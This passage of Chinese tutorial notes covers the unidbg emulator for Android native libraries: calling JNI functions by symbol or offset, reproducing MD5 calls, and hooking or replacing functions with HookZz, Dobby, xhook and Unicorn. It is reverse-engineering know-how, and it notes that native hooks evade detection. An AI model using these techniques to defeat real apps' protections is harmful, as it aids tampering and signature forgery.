libc++.so</li></ul><p>xjb：21课时</p><p>本次案例hook掉encode函数，他是动态注册的，所以unidbg开启JNI_OnLoad函数，但是还是出错。</p><p>报错Illegal JNI version:0xffffffff</p><p>观察.so文件中的JNI_OnLoad函数，发现一个bssFunc函数，跟进发现他是一个导入函数(来自另外的.so)</p><p>那我们就要在要hook的.so文件加载前加载导入函数所在的.so文件。</p><p><code>DalvikModule dm = vm.loadLibrary(new File(&quot;unidbg-android/src/test/java/包路径/.so文件名&quot;), false);</code></p><p>当使用dlopen时候，unidbg会自动处理(因为unidbg源码里有libdl.so)</p><ul><li>一些注意事项</li></ul><ol><li>如果hook的方法不在同一个class下，要使用多个’vm.resolveClass’来加载类</li></ol><p>或者 直接使用module.callFunction()。</p><p>   2.如果函数在多个so中，就需要加载多个so</p><p>   3.在加载我们的so之前，unidbg还加载了一些系统so，可以使用标准C函数，dlopen函数等</p><p>   4.纯so的代码本来就可以执行的</p><p>   5.JNI函数也实现了一些，有一部分JNI函数需要手动接管</p><p>   6.将unidbg日志公开，观察信息。</p><p>​      src/test/resources/log4j.properties中的INFO全改为DEBUG</p><h3 id="通过符号调用函数1"><a href="#通过符号调用函数1" class="headerlink" title="通过符号调用函数1"></a>通过符号调用函数1</h3><p>xjb:23课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//获取到symbol最好先判断是否null</span></span><br><span class="line">    <span class="type">Symbol</span> <span class="variable">symbol</span> <span class="operator">=</span> <span class="keyword">module</span>.findSymbolByName(<span class="string">&#x27;汇编中的函数符号名&#x27;</span>);</span><br><span class="line">    <span class="comment">//返回Number[]，其中第0个成员是返回值</span></span><br><span class="line">    Number[] numbers = symbol.call(emulator,vm.getJNIEnv(),vm.addLocalObject(NativeHelper)，<span class="number">100</span>,<span class="number">200</span>,<span class="number">300</span>);<span class="comment">//写参数的时候看ida中函数参数，要写JniEnv</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">retval</span> <span class="operator">=</span> numbers[<span class="number">0</span>].intValue(); <span class="comment">//Number中结果也是包装过的</span></span><br><span class="line">    System.out.println(retval);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="得到Java的int数据后，根据这个数据去内存中捞对象或者数据"><a href="#得到Java的int数据后，根据这个数据去内存中捞对象或者数据" class="headerlink" title="得到Java的int数据后，根据这个数据去内存中捞对象或者数据"></a>得到Java的int数据后，根据这个数据去内存中捞对象或者数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//获取到symbol最好先判断是否null</span></span><br><span class="line">    <span class="type">Symbol</span> <span class="variable">symbol</span> <span class="operator">=</span> <span class="keyword">module</span>.findSymbolByName(<span class="string">&#x27;_Z7_strcatP7_JNIEnvP7_jclass&#x27;</span>);</span><br><span class="line">    <span class="comment">//返回Number[]，其中第0个成员是返回值</span></span><br><span class="line">    Number[] numbers = symbol.call(emulator,vm.getJNIEnv(),vm.addLocalObject(NativeHelper));<span class="comment">//写参数的时候看ida中函数参数，要写JniEnv</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> numbers[<span class="number">0</span>].intValue();</span><br><span class="line">    System.out.println(vm.getObject(result).getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比如返回的是java对象</p><p>vm.getObject(retval)  ==&gt;  相当于vm.addLocalObject反过程</p><p>比如返回是地址</p><p>emulator.getMemory().pointer(retval).getByteArray(… , …);</p><p>比如返回的是长度</p><p>emulator.getMemory().getByteArray(… , retval);</p><h3 id="通过符号调用函数2"><a href="#通过符号调用函数2" class="headerlink" title="通过符号调用函数2"></a>通过符号调用函数2</h3><p>xjb第24课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span> &#123;</span><br><span class="line">     <span class="type">Number</span> <span class="variable">numbers</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="string">&quot;_Z7_strcatP7_JNIEnvP7_jclass&quot;</span>, vm.getJNIEnv(), vm.addLocalObject(NativeHelper));</span><br><span class="line">       <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> numbers.intValue();</span><br><span class="line">       System.out.println(vm.getObject(result).getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>模拟callStaticJniMethodObject()的功能：</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.找到符号对应的地址</span><br><span class="line"><span class="number">2</span>.包装传入参数</span><br><span class="line"><span class="number">3</span>.Java类型的传递</span><br><span class="line"><span class="number">3.1</span>JNIEnv*的获取</span><br><span class="line">   vm<span class="selector-class">.getJNIEnv</span>()</span><br><span class="line"><span class="number">3.2</span> jclass/jobject的构建</span><br><span class="line">   DvmClass xxx = vm<span class="selector-class">.resolveClass</span>(...)</span><br><span class="line">   DvmObject xxxx = xxx<span class="selector-class">.newObject</span>(null)</span><br><span class="line">   vm<span class="selector-class">.addLocalObject</span>(xxx) <span class="comment">//java类或者对象以引用的方式传入</span></span><br><span class="line">   </span><br><span class="line">DvmObject obj = xxx<span class="selector-class">.newObject</span>(null)</span><br><span class="line">System<span class="selector-class">.out</span><span class="selector-class">.println</span>(vm<span class="selector-class">.addLocalObject</span>(obj)) &lt;==&gt; System<span class="selector-class">.out</span><span class="selector-class">.println</span>(obj<span class="selector-class">.hashCode</span>())</span><br></pre></td></tr></table></figure><h3 id="通过偏移调用函数"><a href="#通过偏移调用函数" class="headerlink" title="通过偏移调用函数"></a>通过偏移调用函数</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    Number number=<span class="keyword">module</span>.callFunction(emulator,<span class="number">0x1B4C</span>,vm.getJNIEnv(), vm.addLocalObject(NativeHelper));</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> number.intValue();</span><br><span class="line">        System.out.println(vm.getObject(result).getValue());</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><strong>2.实现md5</strong></p><p>C语言类型的传递，通过内存处理</p><ul><li>memory.malloc(16).getPointer()</li><li>memory下属很多操作内存的方法</li><li>pointer下属很多操作内存的方法</li><li>MD5_CTX不需要特别的定义 只需给他足够的内存即可 结构体实际上就是一段连续的内存且结构体中存在内存对齐</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">typedef struct&#123;</span><br><span class="line">    unsigned <span class="type">int</span> count[<span class="number">2</span>];  <span class="comment">//长度</span></span><br><span class="line">    unsigned <span class="type">int</span> state[<span class="number">4</span>];  <span class="comment">//初始化魔数</span></span><br><span class="line">    unsigned <span class="type">char</span> buffer[<span class="number">64</span>]; <span class="comment">//明文数据</span></span><br><span class="line">&#125;MD5_CTX; </span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">//MD5Init 调用MD5Init来完成内存开辟即填充数据</span></span><br><span class="line">    <span class="comment">//申请空间 false不需要按页分配</span></span><br><span class="line">    <span class="type">UnidbgPointer</span> <span class="variable">MD5Ctx</span> <span class="operator">=</span> emulator.getMemory().malloc(<span class="number">200</span>, <span class="literal">false</span>).getPointer();</span><br><span class="line">        <span class="keyword">module</span>.callFunction(emulator,<span class="number">0x2230</span>,MD5Ctx); <span class="comment">//调用函数 </span></span><br><span class="line">        <span class="comment">//md5Update</span></span><br><span class="line">        <span class="type">UnidbgPointer</span> <span class="variable">plainText</span> <span class="operator">=</span> emulator.getMemory().malloc(<span class="number">200</span>, <span class="literal">false</span>).getPointer();</span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="string">&quot;adgbuawhi&quot;</span>.getBytes();</span><br><span class="line">        plainText.write(buffer);</span><br><span class="line">        <span class="keyword">module</span>.callFunction(emulator,<span class="number">0x22A0</span>,MD5Ctx,plainText,buffer.length);</span><br><span class="line">        <span class="comment">//MD5Final</span></span><br><span class="line">        <span class="type">UnidbgPointer</span> <span class="variable">cipherText</span> <span class="operator">=</span> emulator.getMemory().malloc(<span class="number">200</span>, <span class="literal">false</span>).getPointer();</span><br><span class="line">        <span class="keyword">module</span>.callFunction(emulator,<span class="number">0x3A78</span>,MD5Ctx,cipherText);</span><br><span class="line">        <span class="type">byte</span>[] byteArray = cipherText.getByteArray(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        Inspector.inspect(byteArray,<span class="string">&quot;MD5Result&quot;</span>);</span><br><span class="line">        <span class="comment">//Inspector.inspect(数据，label);</span></span><br><span class="line">&#125;</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h3 id="unidbg中的Hook"><a href="#unidbg中的Hook" class="headerlink" title="unidbg中的Hook"></a>unidbg中的Hook</h3><ul><li>unidbg支持dobby，hookzz，whale，xhook</li><li>hookzz是dobby的前身，hookzz对32位支持较好，dobby对64位支持较好</li><li>unidbg支持Unicorn自带的各种Hook(指令级hook，块级hook，内存读写hook，异常hook)以及unidbg封装后的console debuger</li><li>原生unicorn hook不容易被检测，console debuger可下多个断点 用于快速验证</li><li>RegisterContext和Arm64RegisterContext，Arm32RegisterContext用法一样，但是Arm32/64RegisterContext可以使用寄存器</li><li>unidbg没法处理子线程中的操作 Hook相应位置，把子线程计算结果赋值给寄存器</li></ul><h3 id="Hookzz的简单使"><a href="#Hookzz的简单使" class="headerlink" title="Hookzz的简单使"></a>Hookzz的简单使</h3><p>Hook MD5Update</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator); <span class="comment">// 加载HookZz，支持inline hook，文档看https://github.com/jmpews/HookZz</span></span><br><span class="line">        hookZz.enable_arm_arm64_b_branch(); <span class="comment">// 测试enable_arm_arm64_b_branch，可有可无</span></span><br><span class="line">        hookZz.wrap(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;_Z9MD5UpdateP7MD5_CTXPhj&quot;</span>), <span class="keyword">new</span> <span class="title class_">WrapCallback</span>&lt;RegisterContext&gt;() &#123; <span class="comment">// inline wrap导出函数</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                md5_ctx = ctx.getPointerArg(<span class="number">0</span>);    <span class="comment">//取指针型参数</span></span><br><span class="line">                <span class="type">Pointer</span> <span class="variable">plainText</span> <span class="operator">=</span> ctx.getPointerArg(<span class="number">1</span>);</span><br><span class="line">                <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> ctx.getIntArg(<span class="number">2</span>);     <span class="comment">//取int型参数</span></span><br><span class="line">                Inspector.inspect(md5_ctx.getByteArray(<span class="number">0</span>,<span class="number">64</span>), <span class="string">&quot;preCall md5_ctx&quot;</span>);</span><br><span class="line">                Inspector.inspect(plainText.getByteArray(<span class="number">0</span>,length), <span class="string">&quot;plainText&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                Inspector.inspect(md5_ctx.getByteArray(<span class="number">0</span>,<span class="number">64</span>), <span class="string">&quot;preCall md5_ctx&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        hookZz.disable_arm_arm64_b_branch();  <span class="comment">//可有可无</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用Hookzz进行Inline-Hook"><a href="#使用Hookzz进行Inline-Hook" class="headerlink" title="使用Hookzz进行Inline Hook"></a>使用Hookzz进行Inline Hook</h3><p>关键：instrument</p><p>xjb第28课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="comment">//add方法</span></span><br><span class="line">    hookZz.instrument(<span class="keyword">module</span>.base + <span class="number">0x1AEC</span>, <span class="keyword">new</span> <span class="title class_">InstrumentCallback</span>&lt;Arm64RegisterContext&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dbiCall</span><span class="params">(Emulator&lt;?&gt; emulator, Arm64RegisterContext ctx, HookEntryInfo info)</span> &#123; <span class="comment">// 通过base+offset inline wrap内部函数，在IDA看到为sub_xxx那些</span></span><br><span class="line">                System.out.println(<span class="string">&quot;W8=0x&quot;</span> + Integer.toHexString(ctx.getXInt(<span class="number">8</span>)) + <span class="string">&quot;, W9=0x&quot;</span> + Integer.toHexString(ctx.getXInt(<span class="number">9</span>)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ctx.getXInt(8) ==&gt; 获得第8个寄存器的值 w8</span></span><br><span class="line"><span class="comment">//Integer.toHexString() ==&gt; 整形转化为十六进制</span></span><br></pre></td></tr></table></figure><h3 id="参数的获取"><a href="#参数的获取" class="headerlink" title="参数的获取"></a>参数的获取</h3><p>xjb第29课时</p><p>hook jstring2cstr    </p><ul><li>以内存写入的方式传递参数，取参数时就读内存</li><li>以addLocalObject方式传入的Java类型参数，取参数时用getObject</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator); <span class="comment">// 加载HookZz，支持inline hook，文档看https://github.com/jmpews/HookZz</span></span><br><span class="line">        hookZz.enable_arm_arm64_b_branch(); <span class="comment">// 测试enable_arm_arm64_b_branch，可有可无</span></span><br><span class="line">        hookZz.wrap(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>), <span class="keyword">new</span> <span class="title class_">WrapCallback</span>&lt;RegisterContext&gt;() &#123; <span class="comment">// inline wrap导出函数</span></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                <span class="comment">//jstr2cstr中是jstring类型 就反用vm.getObject</span></span><br><span class="line">                 <span class="type">int</span> <span class="variable">intArg</span> <span class="operator">=</span> ctx.getIntArg(<span class="number">1</span>);</span><br><span class="line">                 <span class="type">StringObject</span> <span class="variable">str</span> <span class="operator">=</span> vm.getObject(intArg);</span><br><span class="line">                 System.out.println(<span class="string">&quot;precall str = &quot;</span>+str.getValue());</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                <span class="comment">//输出返回值 因为返回值在x0/w0中</span></span><br><span class="line">                <span class="type">byte</span>[] bytes = ctx.getPointerArg(<span class="number">0</span>).getByteArray(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">                <span class="comment">//或者使用getXPointer下的getString方法</span></span><br><span class="line">                String str= ctx.getXPointer(<span class="number">0</span>).getString(<span class="number">0</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;postCall &quot;</span>+str);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        hookZz.disable_arm_arm64_b_branch();  <span class="comment">//可有可无</span></span><br><span class="line"><span class="comment">//调用jstc2Cstr</span></span><br><span class="line">        Number number=<span class="keyword">module</span>.callFunction(emulator,<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>,vm.getJNIEnv(),vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;zxk1ng&quot;</span>)));</span><br><span class="line">        Long cstraddr=number.longValue();<span class="comment">//观察这个jstring2cstr 返回值是一个指针，内容是地址 64位用long</span></span><br><span class="line">    <span class="comment">//因为是地址，所以读内存取参数</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = emulator.getMemory().pointer(cstraddr).getByteArray(<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        Inspector.inspect(bytes,<span class="string">&quot;cstraddr&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进行Hookzz的时候把相应的”RegisterContext”改为“HookZzArm64RegisterContext”</p><p>这时可以修改寄存器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator); <span class="comment">// 加载HookZz，支持inline hook，文档看https://github.com/jmpews/HookZz</span></span><br><span class="line">       hookZz.enable_arm_arm64_b_branch(); <span class="comment">// 测试enable_arm_arm64_b_branch，可有可无</span></span><br><span class="line">       hookZz.wrap(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>), <span class="keyword">new</span> <span class="title class_">WrapCallback</span>&lt;HookZzArm64RegisterContext&gt;() &#123; <span class="comment">// inline wrap导出函数</span></span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookZzArm64RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">intArg</span> <span class="operator">=</span> ctx.getIntArg(<span class="number">1</span>); </span><br><span class="line">                <span class="type">StringObject</span> <span class="variable">str</span> <span class="operator">=</span> vm.getObject(intArg); <span class="comment">//对象是String</span></span><br><span class="line">                System.out.println(<span class="string">&quot;precall str = &quot;</span>+str.getValue());</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="meta">@Override</span></span><br><span class="line">           <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookZzArm64RegisterContext ctx, HookEntryInfo info)</span> &#123;</span><br><span class="line">               <span class="comment">//修改返回值</span></span><br><span class="line">               <span class="type">int</span> hashcode= vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;zxk1ng~&quot;</span>));</span><br><span class="line">               ctx.setXLong(<span class="number">0</span>,hashcode);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;);</span><br><span class="line">       hookZz.disable_arm_arm64_b_branch();  <span class="comment">//可有可无</span></span><br><span class="line">       Number number=<span class="keyword">module</span>.callFunction(emulator,<span class="string">&quot;_Z12jstring2cstrP7_JNIEnvP8_jstring&quot;</span>,vm.getJNIEnv(),vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm,<span class="string">&quot;zxk1ng&quot;</span>)));</span><br><span class="line">       <span class="type">int</span> <span class="variable">hashcode</span> <span class="operator">=</span> number.intValue();</span><br><span class="line">       StringObject strResult=vm.getObject(hashcode);</span><br><span class="line">       System.out.println(strResult.getValue());</span><br></pre></td></tr></table></figure><h3 id="hookzz-replace"><a href="#hookzz-replace" class="headerlink" title="hookzz replace"></a>hookzz replace</h3><p>HOOK替换(hookzz.replace)</p><ul><li>new ReplaceCallback</li><li>替换以后依然可以调用原函数</li><li>不调用原函数的返回设置 return HookStatus.LR(emulator,value);</li></ul><p>xjb第30课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">IHookZz</span> <span class="variable">hookZz</span> <span class="operator">=</span> HookZz.getInstance(emulator);</span><br><span class="line">            hookZz.replace(<span class="keyword">module</span>.findSymbolByName(<span class="string">&quot;Java_com_xiaojianbang_ndk_NativeHelper_md5&quot;</span>), <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123;  <span class="comment">//context获得参数啥的</span></span><br><span class="line">                <span class="comment">//修改返回值为100，注意对此函数调用也进行一定修改</span></span><br><span class="line">                <span class="keyword">return</span> HookStatus.LR(emulator,<span class="number">100</span>);</span><br><span class="line">                <span class="comment">//return super.onCall(emulator,context,originFunction); 返回调用原函数</span></span><br><span class="line">                <span class="comment">//return HookStatus.RET(emulator,originFunction);   返回调用原函数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">int</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodInt(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;xiaojianbang&quot;</span>)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;md5Result: &quot;</span> + md5Result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>调用原函数</li></ul><p>return super.onCall(emulator, context, originFunction) 《==》return HookStatus(emulator, originFunction);</p><h3 id="Dobby"><a href="#Dobby" class="headerlink" title="Dobby"></a>Dobby</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Dobby</span> <span class="variable">dobby</span> <span class="operator">=</span>Dobby.getInstance(emulator); </span><br><span class="line">dobby.replace(address, <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123; </span><br><span class="line">                <span class="comment">//如不想执行源程序逻辑，可直接返回到LR寄存器中的地址</span></span><br><span class="line">                HookStatus.RET(emulator,context.getLR());</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator,context,originFunction); 返回调用原函数</span><br><span class="line">                <span class="comment">//return HookStatus.RET(emulator,originFunction);   返回调用原函数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="xhook"><a href="#xhook" class="headerlink" title="xhook"></a>xhook</h3><p>xhook框架只能实现符号表的hook，优点是稳定</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">IxHook ixHook=XHookImpl.getInstance(emulator);</span><br><span class="line">ixHook.register(soName,符号名，<span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>()&#123;</span><br><span class="line">    <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator,context,originFunction); 返回调用原函数</span><br><span class="line">              </span><br><span class="line">            &#125;</span><br><span class="line">&#125;)</span><br><span class="line">ixHook.refresh();</span><br></pre></td></tr></table></figure><p>需要注意的是传入的函数名称是原始名称，而不是经过ida解释后的名称在使用register方法进行了hook之后，需要使用refresh()方法刷新后，hook才生效</p><h3 id="原生UnicornHook"><a href="#原生UnicornHook" class="headerlink" title="原生UnicornHook"></a>原生UnicornHook</h3><p>xjb第31课时</p><ul><li>基于原生Unicorn API进行hook时，<strong>不需要考虑地址是否 +1</strong></li><li>原生unicorn的HOOK功能强大 <strong>不容易被检测</strong></li><li>emulator.getBanked().reg_write(ArmConst.UC_ARM_REG_PC,value) 修改寄存器值 如果是Thumb 要加1</li></ul><p>下面这个Hook框架：当执行到特定汇编指令时会回调入框架的hook方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">emulator.getBackend().hook_add_new(<span class="keyword">new</span> <span class="title class_">CodeHook</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hook</span><span class="params">(Backend backend, <span 